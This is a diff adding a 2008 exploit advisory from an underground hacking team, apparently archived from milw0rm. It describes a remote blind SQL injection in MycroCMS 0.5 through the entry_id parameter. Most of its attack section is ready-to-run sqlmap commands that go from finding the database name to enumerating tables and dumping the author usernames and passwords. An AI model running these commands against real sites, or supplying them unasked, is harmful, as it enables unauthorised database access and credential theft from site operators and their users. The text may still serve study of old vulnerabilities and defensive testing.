@@ -1,0 +1,60 @@
+=======================================================
+ MycroCMS 0.5 Remote Blind SQL Injection Vulnerability 
+=======================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+AUTHOR : CWH Underground
+DATE   : 11 June 2008
+SITE   : www.citec.us
+
+
+#####################################################
+ APPLICATION : MycroCMS
+ VERSION     : 0.5 (Lastest Version)
+ DOWNLOAD    : http://downloads.sourceforge.net/mycrocms
+#####################################################
+
+---Remote Blind SQL Injection---
+
+***magic_quotes_gpc = off***
+
+-----------------
+ Vulnerable Path
+-----------------
+
+[+] http://[Target]/[mycrocms_path]/mycrocms/?entry_id=[Blind SQL]
+
+
+---------------------------------
+ Blind SQL Injection with SqlMap
+---------------------------------
+
+[+] Find DB name
+POC Exploit: ./sqlmap.py -p "entry_id" -a "./txt/user-agents.txt" --current-db -u http://localhost/mycrocms/?entry_id=3
+
+[+] Enumerate All Tables (Use Database "mycrocms")
+POC Exploit: ./sqlmap.py -p "entry_id" -a "./txt/user-agents.txt" -D "mycrocms" --tables -u http://localhost/mycrocms/?entry_id=3
+
+[+] Enumerate All Columns in Table (Use Table "mbauthor")
+POC Exploit: ./sqlmap.py -p "entry_id" -a "./txt/user-agents.txt" -D "mycrocms" -T "mbauthor" --columns -u http://localhost/mycrocms/?entry_id=3
+
+[+] Dump All Data in Column (Use Column "author_name" and "author_pw")
+POC Exploit: ./sqlmap.py -p "entry_id" -a "./txt/user-agents.txt" -D "mycrocms" -T "mbauthor" -C author_name,author_pw --dump -u http://localhost/mycrocms/?entry_id=3
+
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-11]
